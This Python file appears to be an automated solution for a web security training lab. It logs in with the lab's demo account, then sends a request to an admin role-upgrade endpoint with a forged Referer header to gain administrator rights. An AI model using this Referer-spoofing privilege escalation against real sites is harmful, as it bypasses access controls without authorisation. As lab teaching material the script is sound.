from web_security_academy.core.logger import logger
from urllib.parse import urlencode, urljoin
from bs4 import BeautifulSoup


def solve_lab(session, *args):
    session.login("wiener", "peter", with_csrf=False)

    params = {"username": "wiener", "action": "upgrade"}
    headers = {"Referer": urljoin(session.url, "/admin")}
    vuln = f"/admin-roles?{urlencode(params)}"

    logger.info(f'Visiting "{vuln}" with the following additional header:')
    logger.info(headers)
    session.get_path(f"/admin-roles?{urlencode(params)}", headers=headers)
